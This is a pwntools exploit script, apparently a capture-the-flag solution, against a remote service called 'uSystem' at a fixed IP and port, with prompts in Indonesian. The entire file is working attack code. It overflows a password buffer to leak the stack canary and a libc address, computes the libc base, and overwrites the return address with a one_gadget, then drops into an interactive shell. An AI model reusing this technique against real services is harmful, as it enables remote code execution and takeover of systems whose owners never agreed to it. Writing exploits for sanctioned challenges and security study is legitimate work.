from pwn import *

# p = process(['./uSystem'])
p = remote("103.37.125.56",10004)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)

# context.log_level = 'debug'

p.sendlineafter(b"nama: ",b"3")
p.sendlineafter(b"lu: ",b"AA")
p.sendafter(b"sandi: ",b"B"*32)
p.sendafter(b"sandi: ",b"C"*32)

p.sendlineafter(b"nama: ",b"3")
p.sendlineafter(b"lu: ",b"AA")
p.sendafter(b"sandi: ",b"B"*32)
p.sendafter(b"sandi: ",b"C"*41)
p.recvuntil(b"C"*41)

canary = u64(p.recvuntil(b"!\n",drop=True).rjust(8, b"\x00"))
log.info("Canary leak: " + hex(canary))

p.sendlineafter(b"nama: ",b"3")
p.sendlineafter(b"lu: ",b"AA")
p.sendafter(b"sandi: ",b"B"*32)
p.sendafter(b"sandi: ",b"C"*56)
p.recvuntil(b"C"*56)

leak = u64(p.recvuntil(b"!\n",drop=True).ljust(8, b"\x00"))
log.info("Libc leak: " + hex(leak))

libc.address = leak - libc.symbols["__libc_start_main"] - 243
one_gadgets = [0xe3afe, 0xe3b01, 0xe3b04]
payload = b"A"*40 + p64(canary) + b'A'*8 + p64(libc.address + one_gadgets[1])

p.sendlineafter(b"nama: ",b"3")
p.sendlineafter(b"lu: ",b"AA")

p.sendafter(b"sandi: ",b"B"*32)
p.sendafter(b"sandi: ",payload)

p.sendlineafter(b"nama: ",b"3")
p.sendlineafter(b"lu: ",b"AA")
p.sendlineafter(b"sandi: ",b"A")
p.sendafter(b"sandi: ",b"A")

p.sendlineafter(b"y/n) ",b'y')

p.interactive()
